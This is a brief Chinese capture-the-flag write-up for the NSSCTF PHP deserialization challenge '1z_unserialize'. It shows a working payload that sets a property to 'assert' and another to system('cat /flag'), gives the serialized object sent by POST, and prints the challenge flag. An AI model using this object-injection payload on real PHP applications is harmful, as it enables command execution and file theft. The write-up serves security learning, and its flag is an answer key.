    10.1z_unserialize

    是很简单的反序列化噢

    ​

    直接构造链子 执行destruct()方法 执行危险函数

    关键 在$a($this->title)

    明显的是a参数执行（this->title）

    所以在这里可以构造命令执行，利用assert函数执行system系统命令

    构造方法

    <?php
class lyh{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
     
}
 $a= new lyh();
 $a->lt="assert";
 $a->lly="system('cat /flag');";
 echo(serialize($a));
?>

    找个在线网站执行得到

    O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"assert";s:3:"lly";s:20:"system('cat /flag');";}

    将上面的内容作为post的参数

    NSSCTF{2f084285-b9ec-4b2d-aadd-c17ffae93614}
